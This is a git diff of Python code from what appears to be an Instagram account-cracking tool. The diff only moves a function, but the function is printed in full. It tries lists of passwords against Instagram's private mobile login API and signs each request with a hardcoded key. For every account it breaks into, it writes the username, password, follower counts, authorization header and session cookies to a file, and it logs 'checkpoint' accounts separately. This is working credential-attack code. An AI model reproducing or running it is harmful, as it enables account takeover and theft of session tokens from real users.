@@ -656,8 +656,70 @@ def UserAgentBarcelona():
 	return baseReturn
 
 
- def iniygdipake(username, password):
-	global hitung,success,checkpoint, login
+def i_insta(username, password):
+    global hitung,success,checkpoint, login
+    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY MOBILE WEB {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
+    iniapabree.advance(kaloinijugaapa)
+    for pw in password:
+        try:
+            request = login['Lib']
+            if requests == 'req':ses=requests.Session()
+            else:ses=httpx
+            curl    = ses.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
+            payload = json.dumps({
+                 'phone_id': str(uuid.uuid4()),
+                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
+                 'username': username,
+                 'guid': str(uuid.uuid4()),
+                 'device_id': 'android-'+str(uuid.uuid4()),
+                 'password': pw,
+                 'login_attempt_count': '0',
+               }
+            )
+            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
+            encod  = f'ig_sig_key_version=4&signed_body={param}'
+            header = {
+                 'Authority': 'i.instagram.com',
+                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                 'Connection': 'Close',
+                 'User-Agent': fanuaig(),
+                 'X-IG-Capabilities': 'Fw==',
+                 'X-IG-App-ID': '936619743392459',
+                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2;ig_nrcb=1'
+            }
+            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
+            if 'logged_in_user' in str(response.text):
+                 success +=1
+                 kuki = convert_cookie(response.headers.get('set-cookie'))
+                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
+                 followers, following = info(username)
+                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
+                 tree.add(f"{H2}{username} | {pw}{P2}")
+                 tree.add(f"{H2}{followers} | {following}{P2}")
+                 tree.add(f"{U2}{header['User-Agent']}{P2}")
+                 tree.add(f"{U2}{auth}{P2}\n")
+                 prints(tree)
+                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
+                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
+                 sv.close()
+                 break
+            elif 'https://i.instagram.com/challenge/' in str(response.text):
+                 checkpoint +=1
+                 followers, following = info(username)
+                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
+                 tree.add(f"{K2}{username} | {pw}{P2}")
+                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
+                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
+                 prints(tree)
+                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
+                    sv.write('%s|%s\n'%(username,pw))
+                 sv.close()
+                 break
+        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
+    hitung +=1
+
+def iniygdipake(username,password):
+	global hitung,success,checkpoint,login
 	iniapabree.update(kaloinijugaapa,description=f' {H2}•{P2} CRACK {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
 	iniapabree.advance(kaloinijugaapa)
 	for password in password:
@@ -731,70 +793,6 @@ def UserAgentBarcelona():
 			time.sleep(30)
 	hitung +=1
 
-
-
-
-def i_insta(username, password):
-    global hitung,success,checkpoint, login
-    iniapabree.update(kaloinijugaapa,description=f' {K2}•{P2} FANKY MOBILE WEB {U2}{username} [bold blue]{hitung}[bold white]/[bold blue]{len(fanids)} [bold green]OK : [bold green]{success}  [bold white]-  [bold yellow]CP : [bold yellow]{checkpoint}[white]')
-    iniapabree.advance(kaloinijugaapa)
-    for pw in password:
-        try:
-            request = login['Lib']
-            if requests == 'req':ses=requests.Session()
-            else:ses=httpx
-            curl    = ses.get('https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()))
-            payload = json.dumps({
-                 'phone_id': str(uuid.uuid4()),
-                 '_csrftoken': curl.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
-                 'username': username,
-                 'guid': str(uuid.uuid4()),
-                 'device_id': 'android-'+str(uuid.uuid4()),
-                 'password': pw,
-                 'login_attempt_count': '0',
-               }
-            )
-            param  = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
-            encod  = f'ig_sig_key_version=4&signed_body={param}'
-            header = {
-                 'Authority': 'i.instagram.com',
-                 'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                 'Connection': 'Close',
-                 'User-Agent': fanuaig(),
-                 'X-IG-Capabilities': 'Fw==',
-                 'X-IG-App-ID': '936619743392459',
-                 'Cookie': f'csrftoken={curl.cookies.get("csrftoken")};mid={curl.cookies.get("mid")};dpr=2;ig_nrcb=1'
-            }
-            response = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=encod, headers=header)
-            if 'logged_in_user' in str(response.text):
-                 success +=1
-                 kuki = convert_cookie(response.headers.get('set-cookie'))
-                 auth = f"{response.headers.get('ig-set-authorization')};{kuki}"
-                 followers, following = info(username)
-                 tree = Tree(f"{H2}  AKUN SUKSES {P2}")
-                 tree.add(f"{H2}{username} | {pw}{P2}")
-                 tree.add(f"{H2}{followers} | {following}{P2}")
-                 tree.add(f"{U2}{header['User-Agent']}{P2}")
-                 tree.add(f"{U2}{auth}{P2}\n")
-                 prints(tree)
-                 with open('OK.txt',mode='a', encoding='utf-8') as sv:
-                    sv.write('%s|%s|%s|%s|%s\n'%(username,pw,followers, following,auth))
-                 sv.close()
-                 break
-            elif 'https://i.instagram.com/challenge/' in str(response.text):
-                 checkpoint +=1
-                 followers, following = info(username)
-                 tree = Tree(f"{K2}  AKUN CHECKPOINT{P2}")
-                 tree.add(f"{K2}{username} | {pw}{P2}")
-                 tree.add(f"{K2}{followers} | {following}{P2}", style=f"{color_panel}")
-                 tree.add(f"{M2}{header['User-Agent']}{P2}\n", style=f"{color_panel}")
-                 prints(tree)
-                 with open('CP.txt',mode='a', encoding='utf-8') as sv:
-                    sv.write('%s|%s\n'%(username,pw))
-                 sv.close()
-                 break
-        except (httpx.RemoteProtocolError,requests.exceptions.ConnectionError,httpx.ConnectError):time.sleep(30)
-    hitung +=1
 
 def api_insta(username, password):
     global hitung,success,checkpoint, login
